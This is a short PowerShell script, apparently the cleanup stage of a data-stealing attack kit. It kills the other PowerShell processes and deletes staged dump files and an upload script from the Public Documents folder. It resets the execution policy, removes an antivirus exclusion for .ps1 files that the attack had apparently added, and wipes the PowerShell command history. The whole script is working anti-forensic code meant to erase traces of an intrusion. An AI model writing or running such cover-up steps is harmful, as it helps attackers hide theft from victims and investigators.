#                      _                        
#  _   _  ___  _   _  | | ___ __   _____      __
# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
#  |___/                                        
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Set-Location C:\Users\Public\Documents #Go to public documents location
#Delete all files downloaded before
Remove-Item -r dump/
Remove-Item dump.zip
Remove-Item fin_upload.ps1
Set-ExecutionPolicy restricted -Force #Reset script blocker
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
taskkill -F /IM powershell.exe #Kill all powershell process
